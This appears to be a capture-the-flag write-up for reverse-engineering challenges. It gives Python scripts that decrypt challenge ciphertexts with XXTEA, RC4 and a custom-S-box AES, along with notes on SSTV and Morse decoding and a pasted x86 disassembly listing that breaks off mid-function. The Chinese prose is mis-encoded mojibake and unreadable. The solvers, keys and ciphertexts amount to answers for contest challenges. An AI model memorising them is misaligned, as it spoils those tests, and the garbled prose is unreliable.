äºæ˜¯æˆ‘ä»¬æœ‰äº†æ­£ç¡®çš„è„šæœ¬

```
#!/usr/bin/env python3
"""
XXTEA å®Œæ•´è§£å¯†è„šæœ¬ - å°è¯•æ‰€æœ‰å¯èƒ½çš„ç»„åˆ
"""

import struct

# ============================================================================
# è§£å¯†å‡½æ•°å®šä¹‰
# ============================================================================

def xxtea_decrypt_standard(v, key, delta=0x9E3779B9):
    """æ ‡å‡†XXTEAè§£å¯†ç®—æ³•"""
    def MX(z, y, sum_val, p, e, k):
        return ((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum_val ^ y) + (k[p & 3 ^ e] ^ z))
    
    n = len(v)
    rounds = 6 + 52 // n
    sum_val = (rounds * delta) & 0xFFFFFFFF
    
    y = v[0]
    while rounds > 0:
        e = (sum_val >> 2) & 3
        for p in range(n - 1, 0, -1):
            z = v[p - 1]
            v[p] = (v[p] - MX(z, y, sum_val, p, e, key)) & 0xFFFFFFFF
            y = v[p]
        z = v[n - 1]
        v[0] = (v[0] - MX(z, y, sum_val, 0, e, key)) & 0xFFFFFFFF
        y = v[0]
        sum_val = (sum_val - delta) & 0xFFFFFFFF
        rounds -= 1
    
    return v

def xxtea_decrypt_variant1(v, key, delta=0x9E3779B9):
    """XXTEAå˜ä½“1 - å¾ªç¯æ–¹å‘ä¸åŒ"""
    def MX(z, y, sum_val, p, e, k):
        return ((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum_val ^ y) + (k[p & 3 ^ e] ^ z))
    
    n = len(v)
    rounds = 6 + 52 // n
    sum_val = (rounds * delta) & 0xFFFFFFFF
    
    for _ in range(rounds):
        e = (sum_val >> 2) & 3
        for p in range(n - 1, -1, -1):
            z = v[p - 1] if p > 0 else v[n - 1]
            y = v[(p + 1) % n]
            v[p] = (v[p] - MX(z, y, sum_val, p, e, key)) & 0xFFFFFFFF
        sum_val = (sum_val - delta) & 0xFFFFFFFF
    
    return v

def xxtea_decrypt_variant2(v, key, delta=0x9E3779B9):
    """XXTEAå˜ä½“2 - ä¸åŒçš„ç´¢å¼•æ–¹å¼"""
    def MX(z, y, sum_val, p, e, k):
        return ((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum_val ^ y) + (k[(p ^ e) & 3] ^ z))
    
    n = len(v)
    rounds = 6 + 52 // n
    sum_val = (rounds * delta) & 0xFFFFFFFF
    
    y = v[0]
    while rounds > 0:
        e = (sum_val >> 2) & 3
        for p in range(n - 1, 0, -1):
            z = v[p - 1]
            v[p] = (v[p] - MX(z, y, sum_val, p, e, key)) & 0xFFFFFFFF
            y = v[p]
        z = v[n - 1]
        v[0] = (v[0] - MX(z, y, sum_val, 0, e, key)) & 0xFFFFFFFF
        y = v[0]
        sum_val = (sum_val - delta) & 0xFFFFFFFF
        rounds -= 1
    
    return v

# ============================================================================
# è¾…åŠ©å‡½æ•°
# ============================================================================

def check_printable(data):
    """æ£€æŸ¥æ•°æ®æ˜¯å¦ä¸»è¦ç”±å¯æ‰“å°å­—ç¬¦ç»„æˆ"""
    if len(data) == 0:
        return False, 0.0
    
    printable_count = sum(1 for b in data if 32 <= b <= 126)
    ratio = printable_count / len(data)
    
    # æ£€æŸ¥æ˜¯å¦åŒ…å«å¸¸è§flagæ ¼å¼
    data_lower = data.lower()
    has_flag = b'flag{' in data_lower or b'ctf{' in data_lower or b'FLAG{' in data.upper()
    
    return ratio >= 0.7 or has_flag, ratio

def try_decrypt(cipher, key, method_name, decrypt_func, delta=0x9E3779B9):
    """å°è¯•è§£å¯†å¹¶æ£€æŸ¥ç»“æœ"""
    try:
        v = cipher.copy()
        plaintext = decrypt_func(v, key, delta)
        flag_bytes = b''.join(struct.pack('<I', x) for x in plaintext)
        
        is_valid, ratio = check_printable(flag_bytes)
        
        if is_valid:
            print(f"\n{'='*70}")
            print(f"âœ… æˆåŠŸè§£å¯†!")
            print(f"{'='*70}")
            print(f"æ–¹æ³•: {method_name}")
            print(f"å¯†æ–‡é•¿åº¦: {len(cipher)} DWORDs ({len(cipher)*4} bytes)")
            print(f"å¯†é’¥: {[hex(k) for k in key]}")
            print(f"DELTA: {hex(delta)}")
            print(f"å¯æ‰“å°å­—ç¬¦ç‡: {ratio:.1%}")
            print(f"\nHex: {flag_bytes.hex()}")
            print(f"Raw: {flag_bytes}")
            
            # å°è¯•å¤šç§ç¼–ç 
            for encoding in ['ascii', 'utf-8', 'latin-1']:
                try:
                    flag_str = flag_bytes.decode(encoding)
                    print(f"\nğŸš© Flag ({encoding}): {flag_str}")
                    return True, flag_str
                except:
                    pass
            
            return True, flag_bytes
        
    except Exception as e:
        pass
    
    return False, None

# ============================================================================
# ä¸»å‡½æ•°
# ============================================================================

def main():
    print("ğŸ” XXTEA å¯†æ–‡è§£å¯†å·¥å…·")
    print("="*70)
    
    # æ‰€æœ‰å¯èƒ½çš„å¯†æ–‡ç»„åˆ
    ciphertexts = {
        "å®Œæ•´10ä¸ªå€¼(æ ‡å‡†é¡ºåº)": [
            0x2973BD37, 0x1BA99AA3, 0xB3C20088, 0xBFC393AB, 0x352ADCCF,
            0x3B98E6E6, 0xAE421991, 0xD7B702CF, 0x0EEF6889, 0x08662435
        ],
        "å»é™¤v[1](9ä¸ªå€¼)": [
            0x2973BD37, 0xB3C20088, 0xBFC393AB, 0x352ADCCF, 0x3B98E6E6,
            0xAE421991, 0xD7B702CF, 0x0EEF6889, 0x08662435
        ],
        "å‰8ä¸ªå€¼": [
            0x2973BD37, 0x1BA99AA3, 0xB3C20088, 0xBFC393AB,
            0x352ADCCF, 0x3B98E6E6, 0xAE421991, 0xD7B702CF
        ],
        "å»é™¤v[1]çš„å‰8ä¸ª": [
            0x2973BD37, 0xB3C20088, 0xBFC393AB, 0x352ADCCF,
            0x3B98E6E6, 0xAE421991, 0xD7B702CF, 0x0EEF6889
        ],
        "æŒ‰æ¯”è¾ƒé¡ºåº": [
            0x2973BD37, 0x08662435, 0x0EEF6889, 0xAE421991, 0xD7B702CF,
            0x3B98E6E6, 0x352ADCCF, 0xBFC393AB, 0xB3C20088, 0x1BA99AA3
        ],
    }
    
    # å¯†é’¥çš„ä¸åŒæ’åˆ—
    base_key = [0xC0FF, 0xDEAD, 0xBEEF, 0x5A7D]
    key_variants = [
        ("æ ‡å‡†é¡ºåº", base_key),
        ("ååº", base_key[::-1]),
        ("å¾ªç¯1", [base_key[1], base_key[2], base_key[3], base_key[0]]),
        ("å¾ªç¯2", [base_key[2], base_key[3], base_key[0], base_key[1]]),
        ("å¾ªç¯3", [base_key[3], base_key[0], base_key[1], base_key[2]]),
    ]
    
    # DELTAå€¼
    delta_variants = [
        ("æ ‡å‡†DELTA", 0x9E3779B9),
        ("æ±‡ç¼–DELTA", 0x61C88647),
    ]
    
    # è§£å¯†æ–¹æ³•
    decrypt_methods = [
        ("æ ‡å‡†XXTEA", xxtea_decrypt_standard),
        ("å˜ä½“1", xxtea_decrypt_variant1),
        ("å˜ä½“2", xxtea_decrypt_variant2),
    ]
    
    total_tests = 0
    successful = []
    
    print(f"\nå¼€å§‹æµ‹è¯•æ‰€æœ‰ç»„åˆ...")
    print(f"å¯†æ–‡ç»„åˆ: {len(ciphertexts)}")
    print(f"å¯†é’¥å˜ä½“: {len(key_variants)}")
    print(f"DELTAå€¼: {len(delta_variants)}")
    print(f"è§£å¯†æ–¹æ³•: {len(decrypt_methods)}")
    print(f"æ€»æµ‹è¯•æ•°: {len(ciphertexts) * len(key_variants) * len(delta_variants) * len(decrypt_methods)}")
    print("="*70)
    
    # éå†æ‰€æœ‰ç»„åˆ
    for cipher_name, cipher in ciphertexts.items():
        for key_name, key in key_variants:
            for delta_name, delta in delta_variants:
                for method_name, method in decrypt_methods:
                    total_tests += 1
                    
                    test_name = f"{cipher_name} | {key_name} | {delta_name} | {method_name}"
                    success, result = try_decrypt(cipher, key, test_name, method, delta)
                    
                    if success:
                        successful.append((test_name, result))
    
    # æ€»ç»“
    print(f"\n{'='*70}")
    print(f"æµ‹è¯•å®Œæˆ!")
    print(f"{'='*70}")
    print(f"æ€»æµ‹è¯•æ¬¡æ•°: {total_tests}")
    print(f"æˆåŠŸè§£å¯†: {len(successful)}")
    
    if successful:
        print(f"\næ‰€æœ‰æˆåŠŸçš„è§£å¯†ç»“æœ:")
        for i, (name, result) in enumerate(successful, 1):
            print(f"\n{i}. {name}")
            print(f"   ç»“æœ: {result}")
    else:
        print("\nâŒ æœªæ‰¾åˆ°æœ‰æ•ˆçš„è§£å¯†ç»“æœ")
        print("\nå¯èƒ½çš„é—®é¢˜:")
        print("1. å¯†æ–‡å€¼æå–ä¸æ­£ç¡®")
        print("2. å¯†é’¥å€¼æå–ä¸æ­£ç¡®") 
        print("3. ä½¿ç”¨äº†è‡ªå®šä¹‰çš„åŠ å¯†ç®—æ³•")
        print("4. æ•°æ®æ ¼å¼ä¸æ˜¯æ ‡å‡†çš„XXTEA")

if __name__ == "__main__":
    main()
```



# Genshin

ä»£ç æ²¡æœ‰æ”¾åœ¨main

æ”¾åœ¨äº†fini

ä¸¢aiè§£å¯†

```
def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    out = []
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        out.append(char ^ k)
    return bytes(out)


key = b"geek2025"
ciphertext = bytes([0x52, 0x59, 0xF3, 0x8A, 0x00, 0x0F, 0xE6, 0x56, 0x36, 0xE5,
                    0xF0, 0x33, 0x40, 0x6E, 0x56, 0x81, 0x5A, 0xE5, 0x6F, 0x87,
                    0x6F, 0x9F, 0x21, 0xC9, 0xA6, 0xBB, 0x16, 0x51])

plaintext = rc4(key, ciphertext)
print(plaintext.decode('latin-1'))
```



# Mission Ghost Signal



```
# è‡ªå®šä¹‰Sç›’ï¼ˆåŠ¨æ€è°ƒè¯•è·å¾—ï¼‰
S_BOX = [
    0xA7, 0xB8, 0x36, 0xAF, 0x0E, 0x46, 0x3E, 0x9D, 0xCD, 0x47, 0xDF, 0xAA, 0x97, 0x15, 0xE4, 0x38,
    0x6B, 0x66, 0x04, 0xB6, 0xEF, 0xA3, 0xB2, 0x6F, 0xFD, 0x7A, 0x0B, 0x9C, 0x77, 0x12, 0x40, 0xEB,
    0x94, 0xF8, 0x81, 0x3D, 0xD4, 0x3B, 0x78, 0x72, 0xB5, 0x1C, 0xF0, 0x61, 0x2F, 0xE3, 0xC3, 0xD6,
    0x31, 0xFC, 0x4B, 0x84, 0x41, 0xF7, 0x3F, 0x6E, 0x5E, 0xC1, 0x07, 0xE7, 0x08, 0x33, 0xE2, 0x57,
    0xA6, 0x68, 0xBD, 0x20, 0x2E, 0x30, 0xCC, 0x6A, 0x2D, 0x43, 0x1B, 0xEC, 0xCB, 0xE9, 0xD2, 0x7F,
    0x23, 0x0C, 0x49, 0x11, 0x24, 0xF6, 0x8D, 0xC2, 0x48, 0x65, 0x7B, 0x22, 0x25, 0x3C, 0xAD, 0x1D,
    0x02, 0x70, 0xEA, 0xE1, 0xCA, 0x32, 0xA2, 0x71, 0xD3, 0x80, 0x28, 0xD7, 0x4C, 0x54, 0x18, 0x8B,
    0x42, 0x05, 0xA5, 0xF1, 0x8F, 0x79, 0x2C, 0x19, 0x1A, 0x9A, 0x82, 0x2A, 0xA0, 0x99, 0x00, 0x63,
    0x7C, 0xD0, 0xCF, 0x1F, 0xBA, 0xF9, 0xDD, 0xB7, 0x93, 0x7D, 0xD9, 0x5A, 0xB0, 0xDB, 0x4F, 0x4E,
    0xC8, 0x09, 0x53, 0x9B, 0x45, 0xA4, 0xEE, 0xE6, 0xBC, 0x7E, 0x62, 0xD8, 0xFA, 0xB4, 0xC7, 0x8C,
    0x86, 0xAC, 0x4D, 0xC9, 0x4A, 0x50, 0x5C, 0xD5, 0x8A, 0x6D, 0xF3, 0xA9, 0xE0, 0x98, 0xFE, 0xCE,
    0x91, 0x0A, 0xDA, 0x5F, 0x90, 0x74, 0x5D, 0x85, 0x51, 0x55, 0x17, 0x06, 0xBE, 0xA1, 0x92, 0xA8,
    0x03, 0xC0, 0x52, 0xDC, 0x39, 0x73, 0xFB, 0xF2, 0x67, 0x95, 0x59, 0x56, 0x2B, 0x14, 0x89, 0x87,
    0x21, 0x35, 0xF5, 0xD1, 0x44, 0x26, 0x76, 0xB1, 0xC6, 0xBB, 0x5B, 0x6C, 0x1E, 0xE5, 0x37, 0x16,
    0x88, 0x8E, 0x0F, 0xAE, 0x27, 0xED, 0xFF, 0x96, 0x60, 0x58, 0x10, 0x69, 0x13, 0x3A, 0xC5, 0xF4,
    0x9E, 0x64, 0xE8, 0xDE, 0x75, 0x9F, 0xC4, 0x29, 0xAB, 0x01, 0xB3, 0xBF, 0x83, 0x34, 0x0D, 0xB9
]

# åˆ›å»ºé€†Sç›’
INV_S_BOX = [0] * 256
for i in range(256):
    INV_S_BOX[S_BOX[i]] = i

# è‡ªå®šä¹‰Rcon
RCON = [0x8D, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]

# å¯†æ–‡
ciphertext = bytes([
    0xB2, 0xB3, 0xDC, 0xB9, 0xF8, 0xD6, 0x93, 0xFF, 0xB5,
    0xA1, 0xCC, 0x2A, 0x6F, 0xDE, 0x27, 0x44, 0xAF, 0x21, 0x98,
    0xDD, 0x00, 0xC1, 0x0D, 0x1C, 0x53, 0x06, 0x81, 0x3E, 0x16, 0xAB,
    0xDF, 0x13
])


# å¯†é’¥æ‰©å±•
def key_expansion(key):
    key_symbols = list(key)

    # åˆå§‹è½®å¯†é’¥
    w = []
    for i in range(4):
        w.append([key_symbols[4 * i], key_symbols[4 * i + 1], key_symbols[4 * i + 2], key_symbols[4 * i + 3]])

    # æ‰©å±•åˆ°44ä¸ªå­—ï¼ˆ11è½®ï¼‰
    for i in range(4, 44):
        temp = w[i - 1][:]
        if i % 4 == 0:
            # RotWord
            temp = [temp[1], temp[2], temp[3], temp[0]]
            # SubWord with custom S-box
            temp = [S_BOX[b] for b in temp]
            # XOR with Rcon
            temp[0] ^= RCON[i // 4]

        w.append([w[i - 4][j] ^ temp[j] for j in range(4)])

    return w


# GF(2^8)ä¹˜æ³•è¡¨
def gf_mult(a, b):
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi_bit = a & 0x80
        a = (a << 1) & 0xFF
        if hi_bit:
            a ^= 0x1B
        b >>= 1
    return p


# é€†MixColumns
def inv_mix_columns(state):
    for i in range(4):
        s0, s1, s2, s3 = state[4 * i], state[4 * i + 1], state[4 * i + 2], state[4 * i + 3]
        state[4 * i] = gf_mult(s0, 0x0e) ^ gf_mult(s1, 0x0b) ^ gf_mult(s2, 0x0d) ^ gf_mult(s3, 0x09)
        state[4 * i + 1] = gf_mult(s0, 0x09) ^ gf_mult(s1, 0x0e) ^ gf_mult(s2, 0x0b) ^ gf_mult(s3, 0x0d)
        state[4 * i + 2] = gf_mult(s0, 0x0d) ^ gf_mult(s1, 0x09) ^ gf_mult(s2, 0x0e) ^ gf_mult(s3, 0x0b)
        state[4 * i + 3] = gf_mult(s0, 0x0b) ^ gf_mult(s1, 0x0d) ^ gf_mult(s2, 0x09) ^ gf_mult(s3, 0x0e)


# é€†ShiftRows
def inv_shift_rows(state):
    # Row 1: shift right by 1
    state[1], state[5], state[9], state[13] = state[13], state[1], state[5], state[9]
    # Row 2: shift right by 2
    state[2], state[10] = state[10], state[2]
    state[6], state[14] = state[14], state[6]
    # Row 3: shift right by 3 (= shift left by 1)
    state[3], state[7], state[11], state[15] = state[7], state[11], state[15], state[3]


# é€†SubBytes
def inv_sub_bytes(state):
    for i in range(16):
        state[i] = INV_S_BOX[state[i]]


# AddRoundKeyï¼ˆè¡Œä¼˜å…ˆï¼‰
def add_round_key(state, round_key, round_num):
    for i in range(4):
        for j in range(4):
            state[j + 4 * i] ^= round_key[4 * round_num + i][j]


# AESè§£å¯†ä¸€ä¸ªå—
def decrypt_block(block, round_keys):
    state = list(block)

    # æœ€åä¸€è½®å¯†é’¥
    add_round_key(state, round_keys, 10)

    # 9è½®
    for round_num in range(9, 0, -1):
        inv_shift_rows(state)
        inv_sub_bytes(state)
        add_round_key(state, round_keys, round_num)
        inv_mix_columns(state)

    # ç¬¬0è½®
    inv_shift_rows(state)
    inv_sub_bytes(state)
    add_round_key(state, round_keys, 0)

    return bytes(state)


# ä¸»è§£å¯†å‡½æ•°
def decrypt():
    # å¯†é’¥
    key = b"Syclover2025Geek"
    user_key = b"1145141145144332"

    # ç»„åˆå¯†é’¥ï¼ˆå‰16å­—èŠ‚æ˜¯Sycloverï¼Œå16å­—èŠ‚æ˜¯1145...ï¼‰
    full_key = key + user_key

    # å¯†é’¥æ‰©å±•
    round_keys = key_expansion(key)

    # IVæ˜¯user_key
    iv = list(user_key)

    # è§£å¯†ç¬¬ä¸€ä¸ªå—
    block1 = ciphertext[:16]
    decrypted1 = decrypt_block(block1, round_keys)
    plaintext1 = bytes([decrypted1[i] ^ iv[i] for i in range(16)])

    # è§£å¯†ç¬¬äºŒä¸ªå—
    block2 = ciphertext[16:32]
    decrypted2 = decrypt_block(block2, round_keys)
    plaintext2 = bytes([decrypted2[i] ^ block1[i] for i in range(16)])

    # ç»„åˆ
    plaintext = plaintext1 + plaintext2

    # å»é™¤å¡«å……ï¼ˆæœ€å7ä¸ªå­—èŠ‚åº”è¯¥æ˜¯0x07ï¼‰
    return plaintext[:25]


# æ‰§è¡Œè§£å¯†
result = decrypt()
print("è§£å¯†ç»“æœï¼ˆhexï¼‰:", result.hex())

```

SSTVè§£å¾—åˆ°äºŒç»´ç 
å¼„å‡ºäº†ä¸ªç½‘ç«™ï¼Œåˆä¸€ä¸ªéŸ³é¢‘

æ‘©æ–¯ç”µç è§£å¾—åˆ°

55 31 6C 44 65 7A 64 6F 4D 54 56 66 4D 56 4E 66 4E 46 38 35 63 6A 52 75 52 46 39 6A 4D 45 34 31 63 44 46 79 51 47 4E 5A 4C 6E 30 3D

16è¿›åˆ¶éƒ½ç”¨cyberchefä¸€æŠŠæ¢­ï¼ˆ

# stack_bomb (1)

å®Œæ•´å’Œaiçš„èŠå¤©è®°å½•

Q:

```
åˆ†æè¿™ä¸ªCTFçš„Reverseé¢˜ï¼Œç»™å‡ºè§£å¯†è„šæœ¬ï¼Œ
éœ€è¦ä»€ä¹ˆæ²¡æœ‰ç»™å‡ºçš„å‡½æ•°å®ç°æˆ–å˜é‡çš„å€¼è¯·è¯¢é—®æˆ‘ï¼Œä¸è¦çŒœæµ‹

sub_411FE0      proc near               ; CODE XREF: sub_41131Bâ†‘j
.text:00411FE0
.text:00411FE0 var_18C         = dword ptr -18Ch
.text:00411FE0 var_188         = dword ptr -188h
.text:00411FE0 var_150         = dword ptr -150h
.text:00411FE0 var_94          = byte ptr -94h
.text:00411FE0 var_84          = dword ptr -84h
.text:00411FE0 var_74          = dword ptr -74h
.text:00411FE0 var_64          = dword ptr -64h
.text:00411FE0 var_54          = dword ptr -54h
.text:00411FE0 Buffer          = byte ptr -44h
.text:00411FE0 var_18          = dword ptr -18h
.text:00411FE0 var_14          = dword ptr -14h
.text:00411FE0 var_10          = dword ptr -10h
.text:00411FE0 var_C           = dword ptr -0Ch
.text:00411FE0 var_4           = dword ptr -4
.text:00411FE0
.text:00411FE0                 push    ebp
.text:00411FE1                 mov     ebp, esp
.text:00411FE3                 sub     esp, 154h
.text:00411FE9                 push    ebx
.text:00411FEA                 push    esi
.text:00411FEB                 push    edi             ; char
.text:00411FEC                 lea     edi, [ebp+var_94]
.text:00411FF2                 mov     ecx, 25h
.text:00411FF7                 mov     eax, 0CCCCCCCCh
.text:00411FFC                 rep stosd
.text:00411FFE                 mov     eax, ___security_cookie
.text:00412003                 xor     eax, ebp
.text:00412005                 mov     [ebp+var_4], eax
.text:00412008                 mov     [ebp+var_18], 1
.text:0041200F                 mov     [ebp+var_14], 2
.text:00412016                 mov     [ebp+var_10], 3
.text:0041201D                 mov     [ebp+var_C], 4
.text:00412024                 push    offset Format   ; "plz input your ans:\n"
.text:00412029                 call    sub_4110E6
.text:0041202E                 add     esp, 4
.text:00412031                 mov     esi, esp
.text:00412033                 push    0               ; Ix
.text:00412035                 call    ds:__acrt_iob_func
.text:0041203B                 add     esp, 4
.text:0041203E                 cmp     esi, esp
.text:00412040                 call    sub_41127B
.text:00412045                 mov     esi, esp
.text:00412047                 push    eax             ; Stream
.text:00412048                 push    21h ; '!'       ; MaxCount
.text:0041204A                 lea     eax, [ebp+Buffer]
.text:0041204D                 push    eax             ; Buffer
.text:0041204E                 call    ds:fgets
.text:00412054                 add     esp, 0Ch
.text:00412057                 cmp     esi, esp
.text:00412059                 call    sub_41127B
.text:0041205E                 test    eax, eax
.text:00412060                 jnz     short loc_412079
.text:00412062                 push    offset aError   ; "error"
.text:00412067                 call    sub_4110E6
.text:0041206C                 add     esp, 4
.text:0041206F                 mov     eax, 1
.text:00412074                 jmp     loc_41233B
.text:00412079 ; ---------------------------------------------------------------------------
.text:00412079
.text:00412079 loc_412079:                             ; CODE XREF: sub_411FE0+80â†‘j
.text:00412079                 mov     esi, esp
.text:0041207B                 push    offset Control  ; "\n"
.text:00412080                 lea     eax, [ebp+Buffer]
.text:00412083                 push    eax             ; Str
.text:00412084                 call    ds:strcspn
.text:0041208A                 add     esp, 8
.text:0041208D                 cmp     esi, esp
.text:0041208F                 call    sub_41127B
.text:00412094                 mov     [ebp+var_150], eax
.text:0041209A                 cmp     [ebp+var_150], 21h ; '!'
.text:004120A1                 jnb     short loc_4120A5
.text:004120A3                 jmp     short loc_4120AB
.text:004120A5 ; ---------------------------------------------------------------------------
.text:004120A5
.text:004120A5 loc_4120A5:                             ; CODE XREF: sub_411FE0+C1â†‘j
.text:004120A5                 call    sub_411050
.text:004120AA                 nop
.text:004120AB
.text:004120AB loc_4120AB:                             ; CODE XREF: sub_411FE0+C3â†‘j
.text:004120AB                 mov     ecx, [ebp+var_150]
.text:004120B1                 mov     [ebp+ecx+Buffer], 0
.text:004120B6                 lea     eax, [ebp+Buffer]
.text:004120B9                 push    eax             ; Str
.text:004120BA                 call    j_strlen
.text:004120BF                 add     esp, 4
.text:004120C2                 cmp     eax, 20h ; ' '
.text:004120C5                 jz      short loc_4120DE
.text:004120C7                 push    offset aLenWrong ; "len wrong\n"
.text:004120CC                 call    sub_4110E6
.text:004120D1                 add     esp, 4
.text:004120D4                 mov     eax, 1
.text:004120D9                 jmp     loc_41233B
.text:004120DE ; ---------------------------------------------------------------------------
.text:004120DE
.text:004120DE loc_4120DE:                             ; CODE XREF: sub_411FE0+E5â†‘j
.text:004120DE                 push    8               ; Size
.text:004120E0                 mov     eax, 1
.text:004120E5                 imul    ecx, eax, 0
.text:004120E8                 lea     edx, [ebp+ecx+Buffer]
.text:004120EC                 push    edx             ; Src
.text:004120ED                 lea     eax, [ebp+var_54]
.text:004120F0                 push    eax             ; void *
.text:004120F1                 call    j_memcpy
.text:004120F6                 add     esp, 0Ch
.text:004120F9                 push    8               ; Size
.text:004120FB                 mov     eax, 1
.text:00412100                 shl     eax, 3
.text:00412103                 lea     ecx, [ebp+eax+Buffer]
.text:00412107                 push    ecx             ; Src
.text:00412108                 lea     edx, [ebp+var_64]
.text:0041210B                 push    edx             ; void *
.text:0041210C                 call    j_memcpy
.text:00412111                 add     esp, 0Ch
.text:00412114                 push    8               ; Size
.text:00412116                 mov     eax, 1
.text:0041211B                 shl     eax, 4
.text:0041211E                 lea     ecx, [ebp+eax+Buffer]
.text:00412122                 push    ecx             ; Src
.text:00412123                 lea     edx, [ebp+var_74]
.text:00412126                 push    edx             ; void *
.text:00412127                 call    j_memcpy
.text:0041212C                 add     esp, 0Ch
.text:0041212F                 push    8               ; Size
.text:00412131                 mov     eax, 1
.text:00412136                 imul    ecx, eax, 18h
.text:00412139                 lea     edx, [ebp+ecx+Buffer]
.text:0041213D                 push    edx             ; Src
.text:0041213E                 lea     eax, [ebp+var_84]
.text:00412144                 push    eax             ; void *
.text:00412145                 call    j_memcpy
.text:0041214A                 add     esp, 0Ch
.text:0041214D                 push    offset loc_411307
.text:00412152                 push    offset sub_41109B
.text:00412157                 push    offset sub_4113F2
.text:0041215C                 push    offset loc_411186
.text:00412161                 push    offset sub_41115E
.text:00412166                 push    offset sub_411091
.text:0041216B                 push    offset sub_4112D0
.text:00412170                 push    offset sub_411163
.text:00412175                 push    offset sub_411005
.text:0041217A                 push    offset loc_41139D
.text:0041217F                 push    offset sub_411014
.text:00412184                 push    0
.text:00412186                 push    1
.text:00412188                 push    2
.text:0041218A                 push    3
.text:0041218C                 push    4
.text:0041218E                 push    5
.text:00412190                 push    6
.text:00412192                 push    7
.text:00412194                 push    8
.text:00412196                 push    9
.text:00412198                 push    0Ah
.text:0041219A                 push    0Bh
.text:0041219C                 push    0Ch
.text:0041219E                 push    0Dh
.text:004121A0                 push    0Eh
.text:004121A2                 push    0Fh
.text:004121A4                 push    10h
.text:004121A6                 push    11h
.text:004121A8                 push    12h
.text:004121AA                 push    13h
.text:004121AC                 push    14h
.text:004121AE                 push    15h
.text:004121B0                 push    16h
.text:004121B2                 push    17h
.text:004121B4                 push    18h
.text:004121B6                 push    19h
.text:004121B8                 push    1Ah
.text:004121BA                 push    1Bh
.text:004121BC                 push    1Ch
.text:004121BE                 push    1Dh
.text:004121C0                 push    1Eh
.text:004121C2                 push    1Fh
.text:004121C4                 push    20h ; ' '
.text:004121C6                 push    21h ; '!'
.text:004121C8                 push    22h ; '"'
.text:004121CA                 push    23h ; '#'
.text:004121CC                 push    24h ; '$'
.text:004121CE                 push    25h ; '%'
.text:004121D0                 push    26h ; '&'
.text:004121D2                 push    27h ; '''
.text:004121D4                 push    28h ; '('
.text:004121D6                 push    29h ; ')'
.text:004121D8                 push    2Ah ; '*'
.text:004121DA                 push    2Bh ; '+'
.text:004121DC                 push    2Ch ; ','
.text:004121DE                 push    2Dh ; '-'
.text:004121E0                 push    2Eh ; '.'
.text:004121E2                 push    2Fh ; '/'
.text:004121E4                 push    30h ; '0'
.text:004121E6                 push    31h ; '1'
.text:004121E8                 push    32h ; '2'
.text:004121EA                 push    33h ; '3'
.text:004121EC                 push    34h ; '4'
.text:004121EE                 push    35h ; '5'
.text:004121F0                 push    36h ; '6'
.text:004121F2                 push    37h ; '7'
.text:004121F4                 push    38h ; '8'
.text:004121F6                 push    39h ; '9'
.text:004121F8                 push    3Ah ; ':'
.text:004121FA                 push    3Bh ; ';'
.text:004121FC                 push    3Ch ; '<'
.text:004121FE                 push    3Dh ; '='
.text:00412200                 push    3Eh ; '>'
.text:00412202                 push    3Fh ; '?'
.text:00412204                 push    40h ; '@'
.text:00412206                 push    41h ; 'A'
.text:00412208                 push    42h ; 'B'
.text:0041220A                 push    43h ; 'C'
.text:0041220C                 push    44h ; 'D'
.text:0041220E                 push    45h ; 'E'
.text:00412210                 push    46h ; 'F'
.text:00412212                 push    47h ; 'G'
.text:00412214                 push    48h ; 'H'
.text:00412216                 push    49h ; 'I'
.text:00412218                 push    4Ah ; 'J'
.text:0041221A                 push    4Bh ; 'K'
.text:0041221C                 push    4Ch ; 'L'
.text:0041221E                 push    4Dh ; 'M'
.text:00412220                 push    4Eh ; 'N'
.text:00412222                 push    4Fh ; 'O'
.text:00412224                 mov     eax, [esp+2CCh+var_188]
.text:0041222B                 call    eax
.text:0041222D                 lea     eax, [ebp+var_18]
.text:00412230                 push    eax
.text:00412231                 lea     eax, [ebp+var_54]
.text:00412234                 push    eax
.text:00412235                 mov     eax, [ebp+var_18C]
.text:0041223B                 call    eax
.text:0041223D                 add     esp, 8
.text:00412240                 lea     eax, [ebp+var_18]
.text:00412243                 push    eax
.text:00412244                 lea     eax, [ebp+var_64]
.text:00412247                 push    eax
.text:00412248                 mov     eax, [ebp+var_18C]
.text:0041224E                 call    eax
.text:00412250                 add     esp, 8
.text:00412253                 lea     eax, [ebp+var_18]
.text:00412256                 push    eax
.text:00412257                 lea     eax, [ebp+var_74]
.text:0041225A                 push    eax
.text:0041225B                 mov     eax, [ebp+var_18C]
.text:00412261                 call    eax
.text:00412263                 add     esp, 8
.text:00412266                 lea     eax, [ebp+var_18]
.text:00412269                 push    eax
.text:0041226A                 lea     eax, [ebp+var_84]
.text:00412270                 push    eax
.text:00412271                 mov     eax, [ebp+var_18C]
.text:00412277                 call    eax
.text:00412279                 add     esp, 174h
.text:0041227F                 mov     eax, 4
.text:00412284                 imul    ecx, eax, 0
.text:00412287                 cmp     [ebp+ecx+var_54], 9A8C0C4Bh
.text:0041228F                 jnz     loc_41232C
.text:00412295                 mov     eax, 4
.text:0041229A                 shl     eax, 0
.text:0041229D                 cmp     [ebp+eax+var_54], 0C412FF1Ch
.text:004122A5                 jnz     loc_41232C
.text:004122AB                 mov     eax, 4
.text:004122B0                 imul    ecx, eax, 0
.text:004122B3                 cmp     [ebp+ecx+var_64], 0BFC3A488h
.text:004122BB                 jnz     short loc_41232C
.text:004122BD                 mov     eax, 4
.text:004122C2                 shl     eax, 0
.text:004122C5                 cmp     [ebp+eax+var_64], 0B16C8FD0h
.text:004122CD                 jnz     short loc_41232C
.text:004122CF                 mov     eax, 4
.text:004122D4                 imul    ecx, eax, 0
.text:004122D7                 cmp     [ebp+ecx+var_74], 4136E319h
.text:004122DF                 jnz     short loc_41232C
.text:004122E1                 mov     eax, 4
.text:004122E6                 shl     eax, 0
.text:004122E9                 cmp     [ebp+eax+var_74], 8835E4FFh
.text:004122F1                 jnz     short loc_41232C
.text:004122F3                 mov     eax, 4
